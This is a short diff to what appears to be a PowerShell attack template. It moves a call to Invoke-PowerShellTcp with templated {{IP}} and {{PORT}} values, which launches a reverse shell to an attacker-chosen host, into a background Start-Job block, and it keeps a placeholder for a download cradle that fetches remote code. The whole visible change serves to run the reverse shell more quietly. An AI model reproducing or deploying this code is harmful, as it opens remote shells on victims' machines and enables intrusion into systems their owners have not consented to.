@@ -1,3 +1,5 @@
+Start-Job -ScriptBlock {
+
 $DL_CRADLE = @'
 {{dl_cradle}}
 '@
@@ -191,5 +193,4 @@ function Invoke-PowerShellTcp
 }
 
 
-# Start-Job -ScriptBlock { Invoke-PowerShellTcp {{IP}} {{PORT}} -Reverse }
-Invoke-PowerShellTcp {{IP}} {{PORT}} -Reverse 
+Invoke-PowerShellTcp {{IP}} {{PORT}} -Reverse }
